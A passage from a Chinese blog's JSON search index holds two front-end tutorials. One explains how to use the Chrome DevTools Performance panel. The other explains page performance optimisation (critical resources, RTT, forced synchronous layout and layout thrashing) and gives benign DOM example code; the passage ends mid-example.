class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>欢迎在留言区与我分享你的想法，也欢迎你在留言区记录你的思考过程。感谢阅读，如果你觉得这篇文章对你有帮助的话，也欢迎把它分享给更多的朋友。</p>\n"},{"title":"页面性能工具：如何使用 Performance？","url":"/browser/pages/PagePerformanceTools.html","content":"<p>我们就继续深入，聊聊如何使用 Performance。通常，使用 Performance 需要分三步走：</p>\n<ol>\n<li>第一步是配置 Performance；</li>\n<li>第二步是生成报告页；</li>\n<li>第三步就是人工分析报告页，并找出页面的性能瓶颈。</li>\n</ol>\n<p>接下来，我会根据上面这三个步骤带你熟悉 Performace，并让你了解如何使用 Performance 来分析页面性能数据。</p>\n<h2 id=\"配置Performance\"><a href=\"#配置Performance\" class=\"headerlink\" title=\"配置Performance\"></a>配置 Performance</h2><p>我们在 Chrome 中任意打开一个站点，再打开 Chrome 开发者工具，然后选择 Performance 标签，最终效果如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664361660ea9cb1403fb65fc.png\" alt=\"Performance配置页\"></p>\n<p>上图就是 Performance 的配置页，观察图中区域 1，我们可以设置该区域中的 “Network” 来限制网络加载速度，设置 “CPU” 来限制 CPU 的运算速度。通过设置，我们就可以在 Chrome 浏览器上来模拟手机等性能不高的设备了。在这里我将 CPU 的运算能力降低到了 <strong>1/6</strong>，将网络的加载速度设置为 “** 快的 3G (Fast 3G)**” 用来模拟 3G 的网络状态。</p>\n<p>不同于 Audits 只能监控加载阶段的性能数据，Performance 还可以监控交互阶段的性能数据，不过 Performance 是分别录制这两个阶段的，你可以查看上图区域 2 和区域 3，我们可以看到这里有两个按钮，上面那个黑色按钮是用来记录交互阶段性能数据的，下面那个带箭头的圆圈形按钮用来记录加载阶段的性能数据。</p>\n<p>另外你还要注意一点，这两种录制方式稍微有点不同：</p>\n<ul>\n<li>当你<strong>录制加载</strong>阶段的性能数据时，Performance 会重新刷新页面，并等到页面完全渲染出来后，Performance 就会自动停止录制。</li>\n<li>如果你是<strong>录制交互阶段</strong>的性能时，那么需要手动停止录制过程。</li>\n</ul>\n<h2 id=\"认识报告页\"><a href=\"#认识报告页\" class=\"headerlink\" title=\"认识报告页\"></a>认识报告页</h2><p>无论采用哪种方式录制，最终所生成的报告页都是一样的，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664361a70ea9cb1403fbce6b.png\" alt=\"Performance的报告页\"></p>\n<p>观察上图的报告页，我们可以将它分为三个主要的部分，分别为<strong>概览面板、性能指标面板和详情面板</strong>。</p>\n<p>要熟练掌握这三个面板，我们需要先明白时间线的概念，这是因为概览面板和性能指标面板都依赖于时间线。我们知道，Performance 按照时间的顺序来记录每个时间节点的性能数据，然后再按照时间顺序来展示这些性能数据，那么展示的时候就必然要引入时间线了。比如上图中我们录制了 10000 毫秒，那么它的时间线长度也就是 10000 毫秒，体现在上图中就是概览面板最上面那条线。</p>\n<h3 id=\"概览面板\"><a href=\"#概览面板\" class=\"headerlink\" title=\"概览面板\"></a>概览面板</h3><p>好了，引入了时间线，<strong>Performance 就会将几个关键指标，诸如页面帧速 (FPS)、CPU 资源消耗、网络请求流量、V8 内存使用量 (堆内存) 等，按照时间顺序做成图表的形式展现出来，这就是概览面板</strong>，你可以参看上图。</p>\n<p>有了概览面板，我们就能一览几个关键的历史数据指标，进而能快速定位到可能存在问题的时间节点。那么如何定位可能存在问题的时间节点呢？</p>\n<ul>\n<li>如果 FPS 图表上出现了红色块，那么就表示红色块附近渲染出一帧所需时间过久，帧的渲染时间过久，就有可能导致页面卡顿。</li>\n<li>如果 CPU 图形占用面积太大，表示 CPU 使用率就越高，那么就有可能因为某个 JavaScript 占用太多的主线程时间，从而影响其他任务的执行。</li>\n<li>如果 V8 的内存使用量一直在增加，就有可能是某种原因导致了内存泄漏。<br>除了以上指标以外，概览面板还展示加载过程中的几个关键时间节点，如 FP、LCP、DOMContentLoaded、Onload 等事件产生的时间点。这些关键时间点体现在了几条不同颜色的竖线上。</li>\n</ul>\n<h3 id=\"性能面板\"><a href=\"#性能面板\" class=\"headerlink\" title=\"性能面板\"></a>性能面板</h3><p>通常，我们通过概览面板来定位到可能存在问题的时间节点，接下来需要更进一步的数据，来分析导致该问题的原因，那么应该怎么分析呢？</p>\n<p>这就需要引入<strong>性能面板</strong>了，在性能面板中，记录了非常多的性能指标项，比如 <strong>Main</strong> 指标记录渲染主线程的任务执行过程，<strong>Compositor</strong> 指标记录了合成线程的任务执行过程，<strong>GPU 指标</strong>记录了 GPU 进程主线程的任务执行过程。有了这些详细的性能数据，就可以帮助我们轻松地定位到页面的性能问题。</p>\n<p>简而言之，<strong>我们通过概览面板来定位问题的时间节点，然后再使用性能面板分析该时间节点内的性能数据</strong>。具体地讲，比如概览面板中的 FPS 图表中出现了红色块，那么我们点击该红色块，性能面板就定位到该红色块的时间节点内了，你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664362120ea9cb1403fd662c.png\" alt=\"选择时间线上的一段\"></p>\n<p>观察上图，我们发现性能面板的最上方也有一段时间线，比如上面这个时间线所展示的是从 360 毫秒到 480 毫秒，这段时间就是我们所定位到的时间节点，下面所展示的 Network、Main 等都是该时间节点内的详细数据。</p>\n<p>如果你想要查看事件范围更广的性能指标，你只需要将鼠标放到时间线上，滚动鼠标滚轮就可以就行缩放了。如果放大之后，要查看的内容如果超出了屏幕，那么你可以点击鼠标左键来拖动时间线，直到找到需要查看的内容，你也可以通过键盘上的 “WASD” 四个键来进行缩放和位置的移动。</p>\n<h3 id=\"解读性能面板的各项指标\"><a href=\"#解读性能面板的各项指标\" class=\"headerlink\" title=\"解读性能面板的各项指标\"></a>解读性能面板的各项指标</h3><p>好了，现在我们了解性能面板，它主要用来展现<strong>特定时间段内的多种性能指标数据</strong>。那么要分析这些指标数据，我们就要明白这些指标数据的含义，不过要弄明白它们却并非易事，因为要很好地理解它们，<strong>你需要掌握渲染流水线、浏览器进程架构、导航流程等知识点</strong>。</p>\n<p>因此在介绍性能指标之前，我们还需要岔开一下，回顾下这些前置的知识点。</p>\n<p>因为浏览器的渲染机制过于复杂，所以渲染模块在执行渲染的过程中会被划分为很多子阶段，输入的 HTML 数据经过这些子阶段，最后输出屏幕上的像素，我们把这样的一个处理流程叫做<strong>渲染流水线</strong>。一条完整的渲染流水线包括了<strong>解析 HTML 文件生成 DOM</strong>、<strong>解析 CSS 生成 CSSOM</strong>、<strong>执行 JavaScript</strong>、<strong>样式计算</strong>、<strong>构造布局树</strong>、<strong>准备绘制列表</strong>、<strong>光栅化</strong>、<strong>合成</strong>、<strong>显示</strong>等一系列操作。</p>\n<p>渲染流水线主要是在渲染进程中执行的，在执行渲染流水线的过程中，渲染进程又需要网络进程、浏览器进程、GPU 等进程配合，才能完成如此复杂的任务。另外在渲染进程内部，又有很多线程来相互配合。具体的工作方式你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664362790ea9cb1403fe6773.png\" alt=\"渲染流水线\"></p>\n<p>关于渲染流水线和浏览器进程架构的详细内容我在前面的章节中也做了很多介绍，特别是《<a href=\"/browser/protocol/http/render.html\">渲染流程：HTML、CSS 和 JavaScript，是如何变成页面的？</a>》这节，你可以去回顾下相关章节的课程内容。</p>\n<p>好了，我们简要回顾了渲染流水线和浏览器的进程架构，那么现在回归正题，来分析下性能面板各个指标项的具体含义。你可以参考下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664362c10ea9cb1403feebc0.png\" alt=\"性能面板\"></p>\n<p>观看上图的左边，我们可以看到它是由很多性能指标项组成的，比如 Network、Frames、Main 等，下面我们就来一一分析这些性能指标项的含义。</p>\n<p>我们先看最为重要的 <strong>Main 指标</strong>，它记录了渲染进程的主线程的任务执行记录，在 Perofrmace 录制期间，在渲染主线程上执行的所有记录都可以通过 Main 指标来查看，你可以通过点击 Main 来展开主进程的任务执行记录，具体你可以观察下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/664362e20ea9cb1403ff2810.png\" alt=\"Main指标\"></p>\n<p>观察上图，一段段横条代表执行一个个任务，长度越长，花费的时间越多；竖向代表该任务的执行记录。通过前面章节的学习，我们知道主线程上跑了特别多的任务，诸如渲染流水线的大部分流程，JavaScript 执行、V8 的垃圾回收、定时器设置的回调任务等等，因此 Main 指标的内容非常多，而且非常重要，所以我们在使用 Perofrmance 的时候，大部分时间都是在分析 Main 指标。Main 指标的内容特别多，我会在下一节对它做详细分析。</p>\n<p>通过渲染流水线，我们知道了渲染主线程在生成层树 (LayerTree) 之后，然后根据层树生成每一层的绘制列表，我们把这个过程称为<strong>绘制 (Paint)<strong>。在绘制阶段结束之后，渲染主线程会将这些绘列表制</strong>提交 (commit) 给合成线程，并由合成线程合成出来漂亮的页面。因此，监控合成线程的任务执行记录也相对比较重要，所以 Chrome 又在性能面板中引入了 Compositor 指标</strong>，也就是合成线程的任务执行记录。</p>\n<p>在合成线程执行任务的过程中，还需要 GPU 进程的配合来生成位图，我们把这个 GPU 生成位图的过程称为<strong>光栅化</strong>。如果合成线程直接和 GPU 进程进行通信，那么势必会阻塞后面的合成任务，因此合成线程又维护了一个 <strong>光栅化线程池 (Raster)<strong>，用来让 GPU 执行光栅化的任务。因为光栅化线程池和 GPU 进程中的任务执行也会影响到页面的性能，所以性能面板也添加了这两个指标，分别是</strong> Raster 指标和 GPU 指标</strong>。因为 Raster 是线程池，所以如果你点开 Raster 项，可以看到它维护了多个线程。</p>\n<p>渲染进程中除了有主线程、合成线程、光栅化线程池之外，还维护了一个 IO 线程，具体细节你可以参考《<a href=\"/browser/pageEventLoop/MessageQueuesAndEventLoop.html\">消息队列和事件循环：页面是怎么 “活” 起来的？</a>》这篇文章。该 IO 线程主要用来接收用户输入事件、网络事件、设备相关等事件，如果事件需要渲染主线程来处理，那么 IO 线程还会将这些事件转发给渲染主线程。在性能面板上，<strong>Chrome_ChildIOThread</strong> 指标对应的就是 IO 线程的任务记录。</p>\n<p>好了，以上介绍的都是渲染进程和 GPU 进程的任务记录，除此之外，性能面板还添加了其他一些比较重要的性能指标。</p>\n<p>第一个是 <strong>Network 指标</strong>，网络记录展示了页面中的每个网络请求所消耗的时长，并以瀑布流的形式展现。这块内容和网络面板的瀑布流类似，之所以放在性能面板中是为了方便我们和其他指标对照着分析。</p>\n<p>第二个是 <strong>Timings 指标</strong>，用来记录一些关键的时间节点在何时产生的数据信息，关于这些关键时间点的信息我们在上一节也介绍过了，诸如 FP、FCP、LCP 等。</p>\n<p>第三个是 <strong>Frames 指标</strong>，也就是浏览器生成每帧的记录，我们知道页面所展现出来的画面都是由渲染进程一帧一帧渲染出来的，帧记录就是用来记录渲染进程生成所有帧信息，包括了渲染出每帧的时长、每帧的图层构造等信息，你可以点击对应的帧，然后在详细信息面板里面查看具体信息。</p>\n<p>第四个是 <strong>Interactions 指标</strong>，用来记录用户交互操作，比如点击鼠标、输入文字等交互信息。</p>\n<h3 id=\"详情面板\"><a href=\"#详情面板\" class=\"headerlink\" title=\"详情面板\"></a>详情面板</h3><p>通过性能面板的分析，我们知道了性能面板记录了多种指标的数据信息，并且以图形的形式展现在性能面板上。</p>\n<p>具体地讲，比如主线程上执行了解析 HTML (ParserHTML) 的任务，对应于性能面板就是一个长条和多个竖条组成图形。通过上面的图形我们只能得到一个大致的信息，如果想要查看这些记录的详细信息，就需要引入<strong>详情面板</strong>了。</p>\n<p>你可以通过在性能面板中选中性能指标中的任何历史数据，然后选中记录的细节信息就会展现在详情面板中了。比如我点击了 Main 指标中的 ParserHTML 这个过程，下图就是详情面板展现该过程的详细信息。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6643637e0ea9cb14030038bd.png\" alt=\"详细信息\"></p>\n<p>由于详情面板所涉及的内容很多，而且每种指标的详细内容都有所不同，所以本节我就不展开来讲了。另外你可以去 Google 的官方网站查看 Performance 的一些<span class=\"exturl\" data-url=\"aHR0cHM6Ly9kZXZlbG9wZXJzLmdvb2dsZS5jb20vd2ViL3Rvb2xzL2Nocm9tZS1kZXZ0b29scy9ldmFsdWF0ZS1wZXJmb3JtYW5jZS90aW1lbGluZS10b29sP2hsPXpoLUNO\">基础使用信息<i class=\"fa fa-external-link-alt\"></i></span>。</p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h3><p>好了，本节内容就介绍到这里，下面我来总结下本文的主要内容：</p>\n<p>本节我们首先介绍了如何去配置 Performance 并生成报告页，然后我们将焦点放在了如何解读报告页上。</p>\n<p>之后我们介绍了报告页面主要分为三个部分，概览面板、性能面板和详情面板。</p>\n<p>我们可以通过概览面板来定位问题的时间节点，然后再使用性能面板分析该时间节点内的性能数据。不过在分析数据时，我们需要弄明白性能面板内各项数据指标的含义，要了解这些，需要了解浏览器渲染流水线、浏览器的进程架构等知识点，因此结合这些知识点，我们接下来分析了性能面板的各项指标的含义。</p>\n<p>其中最为重要的是 Main 指标，它记录了渲染主线程上的任务执行情况，不过这块细节内容会非常多，所以我们会在下一节来介绍。</p>\n<p>最后我们还介绍了每个指标项的内容都有详细数据，这些详细数据是通过详情面板来展现，你只需要通过性能面板点击相应的数据，就能通过详情面板来查看详细数据了。不过详情面板所涉及的数据也是非常多的，所以本文也就没对详情面板做过深的介绍了。</p>\n<p>我把 Performance 比喻成一张网，它能把我们在前面章节中很多知识点都网罗起来，并应用到实践中。</p>\n"},{"title":"页面性能：如何系统地优化页面？","url":"/browser/pages/Performance.html","content":"<p>这里我们所谈论的页面优化，其实就是要<strong>让页面更快地显示和响应</strong>。由于一个页面在它不同的阶段，所侧重的关注点是不一样的，所以如果我们要讨论页面优化，就要分析一个页面生存周期的不同阶段。</p>\n<p>通常一个页面有三个阶段：<strong>加载阶段、交互阶段和关闭阶段</strong>。</p>\n<ul>\n<li><strong>加载阶段</strong>，是指从发出请求到渲染出完整页面的过程，影响到这个阶段的主要因素有网络和 JavaScript 脚本。</li>\n<li><strong>交互阶段</strong>，主要是从页面加载完成到用户交互的整合过程，影响到这个阶段的主要因素是 JavaScript 脚本。</li>\n<li><strong>关闭阶段</strong>，主要是用户发出关闭指令后页面所做的一些清理操作。</li>\n</ul>\n<p>这里我们需要<strong>重点关注加载阶段和交互阶段</strong>，因为影响到我们体验的因素主要都在这两个阶段，下面我们就来逐个详细分析下。</p>\n<h2 id=\"加载阶段\"><a href=\"#加载阶段\" class=\"headerlink\" title=\"加载阶段\"></a>加载阶段</h2><p>我们先来分析如何系统优化加载阶段中的页面，还是先看一个典型的渲染流水线，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663b445d0ea9cb140368678f.png\" alt=\"加载阶段渲染流水线\"></p>\n<p>观察上面这个渲染流水线，你能分析出来有哪些因素影响了页面加载速度吗？下面我们就先来分析下这个问题。</p>\n<p>通过前面文章的讲解，你应该已经知道了并非所有的资源都会阻塞页面的首次绘制，比如图片、音频、视频等文件就不会阻塞页面的首次渲染；而 JavaScript、首次请求的 HTML 资源文件、CSS 文件是会阻塞首次渲染的，因为在构建 DOM 的过程中需要 HTML 和 JavaScript 文件，在构造渲染树的过程中需要用到 CSS 文件。</p>\n<p>我们把这些能<strong>阻塞网页首次渲染的资源称为关键资源</strong>。基于关键资源，我们可以继续细化出来三个影响页面首次渲染的核心因素。</p>\n<p><strong>第一个是关键资源个数</strong>。关键资源个数越多，首次页面的加载时间就会越长。比如上图中的关键资源个数就是 3 个，1 个 HTML 文件、1 个 JavaScript 和 1 个 CSS 文件。</p>\n<p><strong>第二个是关键资源大小</strong>。通常情况下，所有关键资源的内容越小，其整个资源的下载时间也就越短，那么阻塞渲染的时间也就越短。上图中关键资源的大小分别是 6KB、8KB 和 9KB，那么整个关键资源大小就是 23KB。</p>\n<p><strong>第三个是请求关键资源需要多少个 RTT（Round Trip Time）</strong>。那什么是 RTT 呢？ 当使用 TCP 协议传输一个文件时，比如这个文件大小是 0.1M，由于 TCP 的特性，这个数据并不是一次传输到服务端的，而是需要拆分成一个个数据包来回多次进行传输的。RTT 就是这里的往返时延。它是网络中一个重要的性能指标，表示从发送端发送数据开始，到发送端收到来自接收端的确认，总共经历的时延。通常 1 个 HTTP 的数据包在 14KB 左右，所以 1 个 0.1M 的页面就需要拆分成 8 个包来传输了，也就是说需要 8 个 RTT。</p>\n<p>我们可以结合上图来看看它的关键资源请求需要多少个 RTT。首先是请求 HTML 资源，大小是 6KB，小于 14KB，所以 1 个 RTT 就可以解决了。至于 JavaScript 和 CSS 文件，这里需要注意一点，由于渲染引擎有一个预解析的线程，在接收到 HTML 数据之后，预解析线程会快速扫描 HTML 数据中的关键资源，一旦扫描到了，会立马发起请求，你可以认为 JavaScript 和 CSS 是同时发起请求的，所以它们的请求是重叠的，那么计算它们的 RTT 时，只需要计算体积最大的那个数据就可以了。这里最大的是 CSS 文件（9KB），所以我们就按照 9KB 来计算，同样由于 9KB 小于 14KB，所以 JavaScript 和 CSS 资源也就可以算成 1 个 RTT。也就是说，上图中关键资源请求共花费了 2 个 RTT。</p>\n<p>了解了影响加载过程中的几个核心因素之后，接下来我们就可以系统性地考虑优化方案了。<strong>总的优化原则就是减少关键资源个数，降低关键资源大小，降低关键资源的 RTT 次数</strong>。</p>\n<ul>\n<li>如何减少关键资源的个数？一种方式是可以将 JavaScript 和 CSS 改成内联的形式，比如上图的 JavaScript 和 CSS，若都改成内联模式，那么关键资源的个数就由 3 个减少到了 1 个。另一种方式，如果 JavaScript 代码没有 DOM 或者 CSSOM 的操作，则可以改成 async 或者 defer 属性；同样对于 CSS，如果不是在构建页面之前加载的，则可以添加媒体取消阻止显现的标志。当 JavaScript 标签加上了 async 或者 defer、CSSlink 属性之前加上了取消阻止显现的标志后，它们就变成了非关键资源了。</li>\n<li>如何减少关键资源的大小？可以压缩 CSS 和 JavaScript 资源，移除 HTML、CSS、JavaScript 文件中一些注释内容，也可以通过前面讲的取消 CSS 或者 JavaScript 中关键资源的方式。</li>\n<li>如何减少关键资源 RTT 的次数？可以通过减少关键资源的个数和减少关键资源的大小搭配来实现。除此之外，还可以使用 CDN 来减少每次 RTT 时长。</li>\n</ul>\n<p>在优化实际的页面加载速度时，你可以先画出优化之前关键资源的图表，然后按照上面优化关键资源的原则去优化，优化完成之后再画出优化之后的关键资源图表。</p>\n<h2 id=\"交互阶段\"><a href=\"#交互阶段\" class=\"headerlink\" title=\"交互阶段\"></a>交互阶段</h2><p>接下来我们再来聊聊页面加载完成之后的交互阶段以及应该如何去优化。谈交互阶段的优化，其实就是在谈渲染进程渲染帧的速度，因为在交互阶段，帧的渲染速度决定了交互的流畅度。因此讨论页面优化实际上就是讨论渲染引擎是如何渲染帧的，否则就无法优化帧率。</p>\n<p>我们先来看看交互阶段的渲染流水线（如下图）。和加载阶段的渲染流水线有一些不同的地方是，在交互阶段没有了加载关键资源和构建 DOM、CSSOM 流程，通常是由 JavaScript 触发交互动画的。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663b45320ea9cb1403698ecf.png\" alt=\"交互阶段渲染流水线\"></p>\n<p>结合上图，我们来一起回顾下交互阶段是如何生成一个帧的。大部分情况下，生成一个新的帧都是由 JavaScript 通过修改 DOM 或者 CSSOM 来触发的。还有另外一部分帧是由 CSS 来触发的。</p>\n<p>如果在计算样式阶段发现有布局信息的修改，那么就会触发<strong>重排</strong>操作，然后触发后续渲染流水线的一系列操作，这个代价是非常大的。</p>\n<p>同样如果在计算样式阶段没有发现有布局信息的修改，只是修改了颜色一类的信息，那么就不会涉及到布局相关的调整，所以可以跳过布局阶段，直接进入绘制阶段，这个过程叫<strong>重绘</strong>。不过重绘阶段的代价也是不小的。</p>\n<p>还有另外一种情况，通过 CSS 实现一些变形、渐变、动画等特效，这是由 CSS 触发的，并且是在合成线程上执行的，这个过程称为合成。因为它不会触发重排或者重绘，而且合成操作本身的速度就非常快，所以执行合成是效率最高的方式。</p>\n<p>回顾了在交互过程中的帧是如何生成的，那接下来我们就可以讨论优化方案了。<strong>一个大的原则就是让单个帧的生成速度变快</strong>。所以，下面我们就来分析下在交互阶段渲染流水线中有哪些因素影响了帧的生成速度以及如何去优化。</p>\n<h3 id=\"1-减少JavaScript脚本执行时间\"><a href=\"#1-减少JavaScript脚本执行时间\" class=\"headerlink\" title=\"1. 减少JavaScript脚本执行时间\"></a>1. 减少 JavaScript 脚本执行时间</h3><p>有时 JavaScript 函数的一次执行时间可能有几百毫秒，这就严重霸占了主线程执行其他渲染任务的时间。针对这种情况我们可以采用以下两种策略：</p>\n<ul>\n<li>一种是将一次执行的函数分解为多个任务，使得每次的执行时间不要过久。</li>\n<li>另一种是采用 Web Workers。你可以把 Web Workers 当作主线程之外的一个线程，在 Web Workers 中是可以执行 JavaScript 脚本的，不过 Web Workers 中没有 DOM、CSSOM 环境，这意味着在 Web Workers 中是无法通过 JavaScript 来访问 DOM 的，所以我们可以把一些和 DOM 操作无关且耗时的任务放到 Web Workers 中去执行。<br>总之，在交互阶段，对 JavaScript 脚本总的原则就是不要一次霸占太久主线程。</li>\n</ul>\n<h3 id=\"2-避免强制同步布局\"><a href=\"#2-避免强制同步布局\" class=\"headerlink\" title=\"2. 避免强制同步布局\"></a>2. 避免强制同步布局</h3><p>在介绍强制同步布局之前，我们先来聊聊正常情况下的布局操作。通过 DOM 接口执行添加元素或者删除元素等操作后，是需要重新计算样式和布局的，不过正常情况下这些操作都是在另外的任务中异步完成的，这样做是为了避免当前的任务占用太长的主线程时间。为了直观理解，你可以参考下面的代码：</p>\n<figure class=\"highlight html\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">\"mian_div\"</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span> <span class=\"attr\">id</span>=<span class=\"string\">\"time_li\"</span>&gt;</span>time<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>geekbang<span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">p</span> <span class=\"attr\">id</span>=<span class=\"string\">\"demo\"</span>&gt;</span>强制布局demo<span class=\"tag\">&lt;/<span class=\"name\">p</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">button</span> <span class=\"attr\">onclick</span>=<span class=\"string\">\"foo()\"</span>&gt;</span>添加新元素<span class=\"tag\">&lt;/<span class=\"name\">button</span>&gt;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">        <span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) {</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">let</span> main_div = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">\"mian_div\"</span>)      </span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">let</span> new_node = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">\"li\"</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"keyword\">let</span> textnode = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createTextNode</span>(<span class=\"string\">\"time.geekbang\"</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">            new_node.<span class=\"title function_\">appendChild</span>(textnode);</span></span><br><span class=\"line\"><span class=\"language-javascript\">            <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">\"mian_div\"</span>).<span class=\"title function_\">appendChild</span>(new_node);</span></span><br><span class=\"line\"><span class=\"language-javascript\">        }</span></span><br><span class=\"line\"><span class=\"language-javascript\">    </span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure>\n\n<p>对于上面这段代码，我们可以使用 Performance 工具来记录添加元素的过程，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663b46c50ea9cb14036bcb09.png\" alt=\"Performance记录添加元素的执行过程\"></p>\n<p>从图中可以看出来，执行 JavaScript 添加元素是在一个任务中执行的，重新计算样式布局是在另外一个任务中执行，这就是正常情况下的布局操作。</p>\n<p>理解了正常情况下的布局操作，接下来我们就可以聊什么是强制同步布局了。</p>\n<p><strong>所谓强制同步布局，是指 JavaScript 强制将计算样式和布局操作提前到当前的任务中</strong>。为了直观理解，这里我们对上面的代码做了一点修改，让它变成强制同步布局，修改后的代码如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> main_div = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">\"mian_div\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">let</span> new_node = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">let</span> textnode = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createTextNode</span>(<span class=\"string\">\"time.geekbang\"</span>)</span><br><span class=\"line\">    new_node.<span class=\"title function_\">appendChild</span>(textnode);</span><br><span class=\"line\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">\"mian_div\"</span>).<span class=\"title function_\">appendChild</span>(new_node);</span><br><span class=\"line\">    <span class=\"comment\">//由于要获取到offsetHeight，</span></span><br><span class=\"line\">    <span class=\"comment\">//但是此时的offsetHeight还是老的数据，</span></span><br><span class=\"line\">    <span class=\"comment\">//所以需要立即执行布局操作</span></span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(main_div.<span class=\"property\">offsetHeight</span>)</span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>将新的元素添加到 DOM 之后，我们又调用了 <code>main_div.offsetHeight</code> 来获取新 main_div 的高度信息。如果要获取到 main_div 的高度，就需要重新布局，所以这里在获取到 main_div 的高度之前，JavaScript 还需要强制让渲染引擎默认执行一次布局操作。我们把这个操作称为强制同步布局。</p>\n<p>同样，你可以看下面通过 Performance 记录的任务状态：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/663b47290ea9cb14036c403d.png\" alt=\"触发强制同步布局Performance图\"></p>\n<p>从上图可以看出来，计算样式和布局都是在当前脚本执行过程中触发的，这就是强制同步布局。</p>\n<p>为了避免强制同步布局，我们可以调整策略，在修改 DOM 之前查询相关值。代码如下所示：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> main_div = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">\"mian_div\"</span>)</span><br><span class=\"line\">    <span class=\"comment\">//为了避免强制同步布局，在修改DOM之前查询相关值</span></span><br><span class=\"line\">    <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(main_div.<span class=\"property\">offsetHeight</span>)</span><br><span class=\"line\">    <span class=\"keyword\">let</span> new_node = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">\"li\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">let</span> textnode = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createTextNode</span>(<span class=\"string\">\"time.geekbang\"</span>)</span><br><span class=\"line\">    new_node.<span class=\"title function_\">appendChild</span>(textnode);</span><br><span class=\"line\">    <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">\"mian_div\"</span>).<span class=\"title function_\">appendChild</span>(new_node);</span><br><span class=\"line\">    </span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"3-避免布局抖动\"><a href=\"#3-避免布局抖动\" class=\"headerlink\" title=\"3. 避免布局抖动\"></a>3. 避免布局抖动</h3><p>还有一种比强制同步布局更坏的情况，那就是布局抖动。所谓布局抖动，是指在一次 JavaScript 执行过程中，多次执行强制布局和抖动操作。为了直观理解，你可以看下面的代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">let</span> time_li = <span class=\"variable language_\">document</span>.<span class=\"title function_\">getElementById</span>(<span class=\"string\">\"time_li\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">100</span>; i++) {</span><br><span class=\"line\">        <span class=\"keyword\">let</span> main_div = <span class=\"variable language_\">document</span>.<span class=\"title 